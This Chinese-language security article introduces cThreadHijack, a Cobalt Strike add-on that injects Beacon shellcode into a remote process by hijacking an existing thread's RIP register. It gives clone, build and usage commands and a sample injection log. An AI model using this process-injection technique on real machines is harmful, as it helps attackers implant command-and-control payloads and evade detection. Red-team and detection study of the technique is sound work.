![](https://image.3001.net/images/20210903/1630600425_6130fce9d4c2eaa5ff099.png!small)

## 关于cThreadHijack

cThreadHijack是一个针对远程进程注入信标对象文件（BOF），该工具主要通过线程劫持技术实现其功能，并且不会生成任何远程线程。

## 运行机制

cThreadHijack可以根据用户提供的监听器参数来生成原始信标Shellcode，并根据用户提供的PID参数将其注入至远程进程中，这一步主要利用的是VirtualAllocEx和WriteProcessMemory方法。

接下来，cThreadHijack并不会通过CreateRemoteThread或其他API生成一个新的远程线程，而是识别目标进程中的第一个线程，挂起目标线程之后，它便会通过一个CONTEXT结构体来获取线程CPU状态的内容。接下来，它会修改CONTEXT结构体中RIP寄存器成员的地址，并将其指向远程Payload。

在执行之前，cThreadHijack会将一个封装了信标Shellcode的程序添加至一个针对CreateThread的调用方法中。CreateThread程序封装在一个名叫NtContinue的函数调用程序，可以允许之前被劫持的线程在不导致远程进程崩溃的前提下恢复运行。cThreadHijack的信标Payload在生成时会带有一个“线程退出函数”，以允许进程在信标退出之后继续执行。

信标监听器的名称如果包含空格的话，必须放在引号中。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/connormcgarr/cThreadHijack.git

## 项目构建

首先，在一台Windows虚拟机上，点击Win键，输入“x64 Native Tools”打开“x64 Native Tools Command
Prompt for VS”对话框。

接下来，将目录修改为“C:\path\to\cThreadHijack”。

然后运行下列命令：

    
    
    nmake -f Makefile.msvc build

最后，通过Cobalt Strike的“Script Console”以及参数“load
/path/to/cThreadHijack.cna”来加载cThreadHijack.cna。

## 工具使用

    
    
    cThreadHijack PID LISTENER_NAME

 **运行结果样例如下：**

    
    
    beacon> cThreadHijack 7340 TESTING
    
    [+] host called home, sent: 268433 bytes
    
    [+] received output:
    
    [+] Target process PID: 7340
    
     
    
    [+] received output:
    
    [+] Opened a handle to PID 7340
    
     
    
    [+] received output:
    
    [+] Found a thread in the target process! Thread ID: 10212
    
     
    
    [+] received output:
    
    [+] Suspending the targeted thread...
    
     
    
    [+] received output:
    
    [+] Wrote Beacon shellcode to the remote process!
    
     
    
    [+] received output:
    
    [+] Virtual memory for CreateThread and NtContinue routines allocated at 0x201f4ab0000 inside of the remote process!
    
     
    
    [+] received output:
    
    [+] Size of NtContinue routine: 64 bytes
    
    [+] Size of CONTEXT structure: 1232 bytes
    
    [+] Size of stack alignment routine: 4
    
    [+] Size of CreateThread routine: 64
    
    [+] Size of shellcode: 261632 bytes
    
     
    
    [+] received output:
    
    [+] Wrote payload to buffer to previously allocated buffer inside of!
    
     
    
    [+] received output:
    
    [+] Current RIP: 0x7ffa55df69a4
    
     
    
    [+] received output:
    
    [+] Successfully pointed the target thread's RIP register to the shellcode!
    
     
    
    [+] received output:
    
    [+] Current RIP: 0x201f4ab0000
    
     
    
    [+] received output:
    
    [+] Resuming the thread! Please wait a few moments for the Beacon payload to execute...

## 项目地址

 **cThreadHijack：** 【[
_GitHub传送门_](https://github.com/connormcgarr/cThreadHijack)】

## 参考资料

[ _https://connormcgarr.github.io/thread-hijacking/_](https://connormcgarr.github.io/thread-hijacking/)

  

